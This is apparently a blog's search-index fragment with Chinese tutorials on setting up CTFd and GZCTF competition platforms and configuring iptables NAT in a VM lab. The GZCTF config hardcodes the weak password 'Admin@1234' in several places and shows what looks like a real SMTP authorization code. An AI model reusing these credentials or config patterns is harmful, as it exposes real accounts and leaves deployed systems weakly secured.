class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-9.png"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">开docker ps -a</span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-10.png"></p><h1 id="访问CTFd"><a href="#访问CTFd" class="headerlink" title="访问CTFd"></a>访问CTFd</h1><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-11.png"></p><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-12.png"></p><h1 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h1><p><strong>汉化包：<a href="https://github.com/Gu-f/CTFd_chinese_CN/tree/master/V3.4.1/CTFd-3.4.1/CTFd">https://github.com/Gu-f/CTFd_chinese_CN/tree/master/V3.4.1/CTFd-3.4.1/CTFd</a></strong></p><p><strong>将&#x2F;root&#x2F;Desktop&#x2F;CTFd&#x2F;CTFd&#x2F;themes&#x2F;下的admin，core 替换成汉化包里的 admin，core</strong></p><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-13.png"></p><h1 id="防火墙开放端口"><a href="#防火墙开放端口" class="headerlink" title="防火墙开放端口"></a>防火墙开放端口</h1><h2 id="安装ufw"><a href="#安装ufw" class="headerlink" title="安装ufw"></a>安装ufw</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install ufw</span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-14.png"></p><h2 id="开启27000到37000个端口"><a href="#开启27000到37000个端口" class="headerlink" title="开启27000到37000个端口"></a>开启27000到37000个端口</h2><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-15.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF平台搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF平台搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nat基于iptables的实现</title>
      <link href="/6298.html"/>
      <url>/6298.html</url>
      
        <content type="html"><![CDATA[<h1 id="Iptables防火墙的配置"><a href="#Iptables防火墙的配置" class="headerlink" title="Iptables防火墙的配置"></a>Iptables防火墙的配置</h1><h2 id="NAT综合案例"><a href="#NAT综合案例" class="headerlink" title="NAT综合案例"></a>NAT综合案例</h2><p><img src="/../images/Nat%E5%9F%BA%E4%BA%8Eiptables%E7%9A%84%E5%AE%9E%E7%8E%B0231013.png"></p><h4 id="准备三台虚拟机，分别配置IP（如上图）"><a href="#准备三台虚拟机，分别配置IP（如上图）" class="headerlink" title="准备三台虚拟机，分别配置IP（如上图）"></a>准备三台虚拟机，分别配置IP（如上图）</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">注意：Intranet网络连接使用Vmware1(仅主机)</span><br><span class="line"></span><br><span class="line">      Firewall网卡1使用Vmware1(仅主机)，网卡2使用Vmware8(NAT)</span><br><span class="line"></span><br><span class="line">      Extranet网络连接使用Vmware8(NAT)</span><br><span class="line"></span><br><span class="line">不懂请自行百度，谢谢！！</span><br></pre></td></tr></table></figure><h4 id="测试三台机器的连通性"><a href="#测试三台机器的连通性" class="headerlink" title="测试三台机器的连通性"></a>测试三台机器的连通性</h4><h5 id="Intranet："><a href="#Intranet：" class="headerlink" title="Intranet："></a>Intranet：</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@intranet ~]<span class="comment"># ping 192.168.10.20</span></span><br><span class="line">PING 192.168.10.20 (192.168.10.20) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.10.20: icmp_seq=1 ttl=64 time=16.0 ms</span><br><span class="line">64 bytes from 192.168.10.20: icmp_seq=2 ttl=64 time=0.402 ms</span><br><span class="line">^C</span><br><span class="line">--- 192.168.10.20 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 1002ms</span><br><span class="line">rtt min/avg/max/mdev = 0.402/8.204/16.007/7.803 ms</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@intranet ~]<span class="comment"># ping 202.112.113.112</span></span><br><span class="line">PING 202.112.113.112 (202.112.113.112) 56(84) bytes of data.</span><br><span class="line">64 bytes from 202.112.113.112: icmp_seq=1 ttl=64 time=1.97 ms</span><br><span class="line">64 bytes from 202.112.113.112: icmp_seq=2 ttl=64 time=0.337 ms</span><br><span class="line">^C</span><br><span class="line">--- 202.112.113.112 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 1002ms</span><br><span class="line">rtt min/avg/max/mdev = 0.337/1.156/1.976/0.820 ms</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@intranet ~]<span class="comment"># ping 202.112.113.113</span></span><br><span class="line">PING 202.112.113.113 (202.112.113.113) 56(84) bytes of data.</span><br><span class="line">^C</span><br><span class="line">--- 202.112.113.113 ping statistics ---</span><br><span class="line">8 packets transmitted, 0 received, 100% packet loss, time 7001ms</span><br></pre></td></tr></table></figure><h5 id="Firewall"><a href="#Firewall" class="headerlink" title="Firewall:"></a>Firewall:</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@firewall ~]<span class="comment"># ping 192.168.10.1</span></span><br><span class="line">PING 192.168.10.1 (192.168.10.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.10.1: icmp_seq=1 ttl=64 time=0.337 ms</span><br><span class="line">64 bytes from 192.168.10.1: icmp_seq=2 ttl=64 time=0.550 ms</span><br><span class="line">^C</span><br><span class="line">--- 192.168.10.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 1000ms</span><br><span class="line">rtt min/avg/max/mdev = 0.337/0.443/0.550/0.108 ms</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@firewall ~]<span class="comment"># ping 202.112.113.113</span></span><br><span class="line">PING 202.112.113.113 (202.112.113.113) 56(84) bytes of data.</span><br><span class="line">64 bytes from 202.112.113.113: icmp_seq=1 ttl=64 time=0.511 ms</span><br><span class="line">64 bytes from 202.112.113.113: icmp_seq=2 ttl=64 time=0.393 ms</span><br><span class="line">^C</span><br><span class="line">--- 202.112.113.113 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 1000ms</span><br><span class="line">rtt min/avg/max/mdev = 0.393/0.452/0.511/0.059 ms</span><br></pre></td></tr></table></figure><h5 id="Extranet"><a href="#Extranet" class="headerlink" title="Extranet:"></a>Extranet:</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@extranet ~]<span class="comment"># ping 202.112.113.112</span></span><br><span class="line">PING 202.112.113.112 (202.112.113.112) 56(84) bytes of data.</span><br><span class="line">64 bytes from 202.112.113.112: icmp_seq=1 ttl=64 time=0.213 ms</span><br><span class="line">64 bytes from 202.112.113.112: icmp_seq=2 ttl=64 time=0.397 ms</span><br><span class="line">^C</span><br><span class="line">--- 202.112.113.112 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 1001ms</span><br><span class="line">rtt min/avg/max/mdev = 0.213/0.305/0.397/0.092 ms</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@extranet ~]<span class="comment"># ping 192.168.10.20</span></span><br><span class="line">PING 192.168.10.20 (192.168.10.20) 56(84) bytes of data.</span><br><span class="line">^C</span><br><span class="line">--- 192.168.10.20 ping statistics ---</span><br><span class="line">3 packets transmitted, 0 received, 100% packet loss, time 2000ms</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@extranet ~]<span class="comment"># ping 192.168.10.1</span></span><br><span class="line">PING 192.168.10.1 (192.168.10.1) 56(84) bytes of data.</span><br><span class="line">^C</span><br><span class="line">--- 192.168.10.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 0 received, 100% packet loss, time 2000ms</span><br></pre></td></tr></table></figure><h4 id="配置yum源"><a href="#配置yum源" class="headerlink" title="配置yum源"></a>配置yum源</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@firewall ipv4]<span class="comment"># mount /dev/cdrom /media       #挂载镜像</span></span><br><span class="line">mount: /dev/sr0 写保护，将以只读方式挂载</span><br><span class="line"></span><br><span class="line">vim /etc/yum.repos.d/rhel.repo</span><br><span class="line"></span><br><span class="line">[dvd]</span><br><span class="line">name=redhat</span><br><span class="line">baseurl=file:///media</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line"></span><br><span class="line">保存退出之后（:wq）</span><br><span class="line">输入：yum clean all</span><br></pre></td></tr></table></figure><h5 id="可能出现的问题"><a href="#可能出现的问题" class="headerlink" title="可能出现的问题"></a>可能出现的问题</h5><ol><li>您已启用软件包 GPG 签名检查，这样很好。不过您尚未安装任何 GPG 公钥……<br>这是因为你的gpgcheck的值为1；</li></ol><blockquote><p>rpm –import &#x2F;media&#x2F;RPM-GPG-KEY-redhat-release</p></blockquote><ol start="2"><li>failure: repodata&#x2F;repomd.xml from dvd: [Errno 256] No more mirrors to try.<br>file:&#x2F;&#x2F;&#x2F;medi&#x2F;repodata&#x2F;repomd.xml: [Errno 14] curl#37 - “Couldn’t open file &#x2F;medi&#x2F;repodata&#x2F;repomd.xml”</li></ol><blockquote><p>检查一下yum源的配置文件，baseurl路径是否有写错误</p></blockquote><ol start="3"><li>显示依赖不全</li></ol><blockquote><p>从头挂载，重新配置yum源</p></blockquote><h4 id="安装iptables服务"><a href="#安装iptables服务" class="headerlink" title="安装iptables服务"></a>安装iptables服务</h4><p>在 <strong>Firewall</strong> 机器上安装</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install iptables iptables-services -y</span><br></pre></td></tr></table></figure><h4 id="开启路由存储转发，其值为1"><a href="#开启路由存储转发，其值为1" class="headerlink" title="开启路由存储转发，其值为1"></a>开启路由存储转发，其值为1</h4><p><strong>工作原理</strong></p><blockquote><p><strong>内网向公网发送数据包时</strong>，由于目的主机跟源主机 <strong>不在同一网段</strong> ，所以数据包暂时发往 <strong>内网默认网关</strong> 处理，而本网段的主机对此数据包不做任何回应。<br>由于<strong>源主机IP是私有的</strong>，禁止在公网使用，所以必须将数据包的<strong>源发送地址</strong>改成<strong>公网上的可用IP</strong>，网关收到数据包后就要<strong>转换IP</strong>。然后网关再把数据包发往目的主机。</p></blockquote><blockquote><p><strong>目的主机收到数据包之后</strong>，只认为这是网关发送的请求，并不知道内网主机的存在，也没必要知道，<strong>目的主机处理完请求</strong>，把回应信息发还给网关。<br><strong>网关收到后</strong>，将目的主机发还的数据包的 <strong>目的ip地址</strong> 改为发出请求的 <strong>内网主机的ip地址</strong>，并将其发给内网主机。这就是数据包的<strong>路由转发</strong>。内网的主机只要查看数据包的目的ip与发送请求的源主机ip地址相同，就会回应，这就完成了一次请求。</p></blockquote><blockquote><p>出于安全考虑，<strong>Linux系统默认是禁止数据包转发的。</strong> 所谓转发即当主机拥有<strong>一块以上的网卡时</strong>，其中一块收到数据包，根据数据包的目的ip地址将包发往本机另一网卡，该网卡根据路由表继续发送数据包。这通常就是路由器所要实现的功能。</p></blockquote><p><strong>设置</strong><br>开启IP转发功能：<br>临时开启：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>永久开启：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. vim /etc/sysctl.conf</span><br><span class="line">2. net.ipv4.ip_forward = 1     (在这个/etc/sysctl.conf文件里插入；1表示开启，0表示关闭)</span><br><span class="line">3. sysctl -p</span><br></pre></td></tr></table></figure><h3 id="SNAT"><a href="#SNAT" class="headerlink" title="SNAT"></a>SNAT</h3><p>改变源地址，实现局域网使用同一个公网IP接入Internel，好处如下：</p><ol><li>保护内网用户安全，因为公网地址总有一些人会恶意扫描，而内网地址在公网没有路由，所以无法被扫描，能被扫描的只有防火墙这一台，这样就减少了被攻击的可能。</li><li>IPV4地址匮乏，很多公司只有一个IPV4地址，但是却有几百个用户需要上网，这个时候就需要使用SNAT。</li><li>省钱，公网地址付费，使用SNAT只需要一个公网IP就可以满足几百人同时上网<br><a href="http://t.zoukankan.com/yuhaohao-p-14096431.html">想要了解更多，请点击&gt;&gt;</a></li></ol><h4 id="在Firewall上配置SNAT"><a href="#在Firewall上配置SNAT" class="headerlink" title="在Firewall上配置SNAT"></a>在Firewall上配置SNAT</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. iptables 和 firewalld 不能同时开启</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl start iptables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 查看旧iptables的规则，并清空规则</span></span><br><span class="line">iptables -L</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 添加SNAT，修改源目的地址的内网IP (注意大小写)</span></span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -j SNAT --to-source 202.112.113.112</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 查看是否添加成功</span></span><br><span class="line">iptables -t nat -L</span><br><span class="line"></span><br><span class="line"><span class="comment">## 如果添加成功会有这一条记录（仔细找找）</span></span><br><span class="line">POSTROUTING_ZONES  all  --  anywhere             anywhere          </span><br><span class="line">SNAT       all  --  192.168.10.0/24      anywhere             to:202.112.113.112</span><br><span class="line"></span><br><span class="line"><span class="comment">## 5. 如果上面的操作都没有问题，则现在内网的机器（Intranet）可以ping通外网（Extranet）。如果不行，请重复上述操作</span></span><br></pre></td></tr></table></figure><h4 id="在Extranet上提供WEB服务"><a href="#在Extranet上提供WEB服务" class="headerlink" title="在Extranet上提供WEB服务"></a>在Extranet上提供WEB服务</h4><p><strong>安装httpd</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install httpd -y</span><br></pre></td></tr></table></figure><blockquote><p><a href="#%E9%85%8D%E7%BD%AEyum%E6%BA%90">安装不成功请点击查看yum源配置</a></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 防火墙允许开启http服务</span></span><br><span class="line">firewall-cmd --permanent --add-service=http</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 重启防火墙</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 重启http服务</span></span><br><span class="line">systemctl restart httpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 查看80端口是否开放</span></span><br><span class="line">netstat -an | grep :80</span><br><span class="line"></span><br><span class="line">显示如下，表示80端口开放，（回车发现什么也没有，说明没有开放80端口）：</span><br><span class="line">[root@extranet ~]<span class="comment"># netstat -an | grep :80</span></span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN</span><br><span class="line"><span class="comment">## 通常重启httpd服务之后就会开启80端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 测试，在本机查看WEB服务是否正常运行，能打开页面并看到页面内容说明成功，</span></span><br><span class="line"><span class="comment">#   如果出现 无法连接、页面载入出错，重试 等字样，说明失败。</span></span><br><span class="line"><span class="comment">#   请重新安装httpd服务，并重新操作上述步骤</span></span><br><span class="line"></span><br><span class="line">可以自己在 /var/www/html 里面编写一些网页</span><br><span class="line"></span><br><span class="line">firefox 127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>在Extranet上配置好WEB服务之后</strong><br>可以在Intranet的浏览器上输入Extranet的IP地址就可以访问到页面，效果如下<br><img src="/../images/Nat%E5%9F%BA%E4%BA%8Eiptables%E7%9A%84%E5%AE%9E%E7%8E%B0231013-1.png"></p><h3 id="DNAT"><a href="#DNAT" class="headerlink" title="DNAT"></a>DNAT</h3><p>改变目标地址，外网可以访问到内网服务器</p><ol><li>配置双网卡，一网卡对内，一网卡对外；一般是高访问量的web服务器，为了避免占用网关的流量才这样做，使用不是很广泛。</li><li>内网web服务器，或是ftp服务器，为了用户在公网也可以访问，有不想买公网ip地址，采用DNAT方案。<br><a href="http://t.zoukankan.com/yuhaohao-p-14096431.html">想要了解更多，请点击&gt;&gt;</a></li></ol><h4 id="在Intranet上配置WEB、防火墙"><a href="#在Intranet上配置WEB、防火墙" class="headerlink" title="在Intranet上配置WEB、防火墙"></a>在Intranet上配置WEB、防火墙</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装httpd服务</span></span><br><span class="line">yum install httpd -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 启动httpd服务</span></span><br><span class="line">systemctl start httpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 每一次开机都自动开启httpd服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> httpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 安装iptables</span></span><br><span class="line">yum install iptables iptables-services -y</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl start iptables</span><br><span class="line">systemctl <span class="built_in">enable</span> iptables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 查看是否启动成功</span></span><br><span class="line">systemctl status iptables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 清空旧规则</span></span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 开放80端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><p><strong>在Firewall上配置DNAT</strong><br>将外网请求的80端口数据包，修改目的地址为内网的Intranet</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -d 202.112.113.112 -p tcp --dport 80 -</span><br><span class="line">j DNAT --to-destination 192.168.10.1:80</span><br></pre></td></tr></table></figure><p><strong>此时，在外网的机器就可以访问内网的网页了，如下图：</strong><br><img src="/../images/Nat%E5%9F%BA%E4%BA%8Eiptables%E7%9A%84%E5%AE%9E%E7%8E%B0231013-2.png"></p><h5 id="如果内网想拒绝其他的服务（FTP，SSH，samba等等），就输入："><a href="#如果内网想拒绝其他的服务（FTP，SSH，samba等等），就输入：" class="headerlink" title="如果内网想拒绝其他的服务（FTP，SSH，samba等等），就输入："></a>如果内网想拒绝其他的服务（FTP，SSH，samba等等），就输入：</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT-j REJECT</span><br></pre></td></tr></table></figure><p>iptables还有很多的命令，到时候再弄一个专题来研究</p><p>本期的Iptables综合案例就到此结束，上面的问题如果有啥问题请联系作者<a href="JChan_L">^wechar</a>，谢谢观看！</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GZctf平台搭建</title>
      <link href="/8dfc.html"/>
      <url>/8dfc.html</url>
      
        <content type="html"><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.下载安装docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.27.4/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment"># 2.修改文件权限</span></span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment"># 3.查看docker-compose版本</span></span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure><h1 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull gztime/gzctf:latest</span><br><span class="line">docker pull postgres:alpine</span><br></pre></td></tr></table></figure><ol><li>创建一个GZCTF文件夹</li><li>文件里创建下面这两个文件，<code>docker-compse.yml</code>和 <code>appsettings.json</code></li></ol><h1 id="配置docker-compose-yml"><a href="#配置docker-compose-yml" class="headerlink" title="配置docker-compose.yml"></a>配置docker-compose.yml</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.0&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">gztime/gzctf:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=Admin@1234&quot;</span> <span class="comment"># 管理员账户密码，账号为Admin</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span> <span class="comment"># 对外端口号，前为外部端口。</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/uploads&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./logs:/app/log&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot;</span></span><br><span class="line">      <span class="comment"># - &quot;./k8sconfig.yaml:/app/k8sconfig.yaml:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=Admin@1234&quot;</span> <span class="comment"># 数据库密码，务必要和appsettings.json中的配置一致</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><h1 id="配置appsettings-json"><a href="#配置appsettings-json" class="headerlink" title="配置appsettings.json"></a>配置appsettings.json</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=Admin@1234&quot;</span></span><br><span class="line">      <span class="comment">//&lt;String1&gt;换成数据库密码，随机密码且长度足够</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;LogLevel&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Default&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Microsoft&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Warning&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Microsoft.Hosting.Lifetime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//邮箱配置</span></span><br><span class="line">  <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;SendMailAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Admin@qq.com&quot;</span><span class="punctuation">,</span>        <span class="comment">// 填入邮箱</span></span><br><span class="line">    <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctf_noreply&quot;</span><span class="punctuation">,</span>                 <span class="comment">// 发件人名称</span></span><br><span class="line">    <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UWPTINWMFPQVMPAH&quot;</span><span class="punctuation">,</span>            <span class="comment">// 邮箱密码，部分服务商需要填入授权码</span></span><br><span class="line">    <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;smtp.163.com&quot;</span><span class="punctuation">,</span>                  <span class="comment">// 此处为163邮箱服务器，具体自定</span></span><br><span class="line">      <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">465</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Admin@1234&quot;</span><span class="punctuation">,</span>                      <span class="comment">// 自定XorKey</span></span><br><span class="line">  <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Docker&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.16.128&quot;</span><span class="punctuation">,</span>           <span class="comment">// 域名或IP配置，用于容器生成,域名不带http/https</span></span><br><span class="line">    <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span>                                <span class="comment">// 本地配置Docker因此此处置空</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RegistryConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">//谷歌验证码配置</span></span><br><span class="line">  <span class="attr">&quot;GoogleRecaptcha&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;VerifyAPIAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Sitekey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Secretkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RecaptchaThreshold&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.5&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>记得把注释全部删掉，需要修改的地方PublicEntry，根据自己服务器IP进行配置。其他自行修改</p><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>在GZCTF文件夹下面输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/../images/GZctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA231013.png"></p><h1 